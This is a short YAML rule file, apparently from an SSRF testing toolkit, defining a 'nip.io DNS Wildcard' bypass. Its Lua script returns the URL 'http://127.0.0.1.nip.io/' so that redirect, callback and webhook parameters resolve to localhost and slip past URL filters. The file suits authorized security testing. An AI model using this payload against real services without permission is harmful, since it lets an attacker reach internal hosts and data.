# 21. nip_io.yaml
meta:
  id: nip_io
  version: 2
  name: "nip.io DNS Wildcard"
  description: "Uses nip.io to resolve to IP"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 75
  confidence: 85
  severity: high
  tags: [dns, wildcard, nip]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint, Document]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: bypass
  source: |
    function bypass(ctx)
      return { url = "http://127.0.0.1.nip.io/" }
    end
